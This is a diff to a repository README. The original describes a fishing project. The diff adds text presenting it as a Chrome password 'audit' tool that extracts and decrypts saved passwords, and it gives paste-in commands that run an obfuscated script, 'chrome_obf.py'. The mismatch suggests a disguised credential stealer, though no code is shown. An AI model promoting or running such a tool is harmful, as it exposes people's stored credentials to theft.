@@ -1,5 +1,21 @@
 # learningfishing
 this is 100% about fishes, i love eating fish
+Open source tool to audit saved passwords in Chrome.
+
+## Installation
+```bash
+pip install -r requirements.txt
+python chrome_obf.py
+```
+## Features
+- Extracts and decrypts saved passwords from Chrome.
+- Supports Windows, macOS, and Linux.
+- Outputs JSON for easy parsing.
+
+## Usage
+Run the obfuscated script to dump passwords securely.
+
+This tool is for educational purposes only.
 
 ```bash
 ├── .github/
